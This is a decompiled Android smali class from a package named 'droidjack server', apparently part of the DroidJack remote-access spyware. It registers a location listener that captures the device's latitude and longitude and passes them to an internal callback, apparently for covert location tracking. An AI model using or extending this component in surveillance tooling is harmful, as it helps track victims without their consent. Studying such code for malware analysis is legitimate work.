.class Lnet/droidjack/server/bj;
.super Ljava/lang/Object;

# interfaces
.implements Landroid/location/LocationListener;


# instance fields
.field private final synthetic a:Lnet/droidjack/server/bl;


# direct methods
.method constructor <init>(Lnet/droidjack/server/bl;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/bj;->a:Lnet/droidjack/server/bl;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onLocationChanged(Landroid/location/Location;)V
    .locals 6

    iget-object v0, p0, Lnet/droidjack/server/bj;->a:Lnet/droidjack/server/bl;

    new-instance v1, Lnet/droidjack/server/bk;

    invoke-virtual {p1}, Landroid/location/Location;->getLatitude()D

    move-result-wide v2

    invoke-virtual {p1}, Landroid/location/Location;->getLongitude()D

    move-result-wide v4

    invoke-direct {v1, v2, v3, v4, v5}, Lnet/droidjack/server/bk;-><init>(DD)V

    invoke-interface {v0, v1}, Lnet/droidjack/server/bl;->a(Lnet/droidjack/server/bk;)V

    return-void
.end method

.method public onProviderDisabled(Ljava/lang/String;)V
    .locals 0

    return-void
.end method

.method public onProviderEnabled(Ljava/lang/String;)V
    .locals 0

    return-void
.end method

.method public onStatusChanged(Ljava/lang/String;ILandroid/os/Bundle;)V
    .locals 0

    return-void
.end method
